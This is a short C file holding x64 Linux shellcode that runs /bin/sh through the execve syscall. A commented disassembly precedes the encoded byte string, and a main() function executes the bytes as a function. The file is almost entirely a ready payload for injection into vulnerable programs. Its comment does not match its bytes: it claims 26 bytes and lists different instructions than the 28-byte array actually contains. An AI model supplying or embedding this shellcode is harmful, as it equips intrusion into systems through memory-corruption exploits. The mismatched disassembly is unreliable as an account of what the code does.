#include <stdio.h>

/* 

x64 execve /bin/sh -- 26 Bytes -- 7MAY017 -- icon

0:  31 c0                   xor    eax,eax
2:  48 89 c2                mov    rdx,rax
5:  50                      push   rax
6:  48 b9 2f 62 69 6e 2f    movabs rcx,0x68732f2f6e69622f
d:  2f 73 68
10: 51                      push   rcx
11: 48 89 e7                mov    rdi,rsp
14: 50                      push   rax
15: 57                      push   rdi
16: b0 3b                   mov    al,0x3b
18: 0f 05                   syscall
*/

char execve_sh[] = \
"\x31\xC0\x31\xD2\x50\x48\xB9\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x51\x48\x89\xE7\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05"






;


int main(int argc, char **argv){
  int (*test)() = (int(*)())execve_sh;
  test();
}
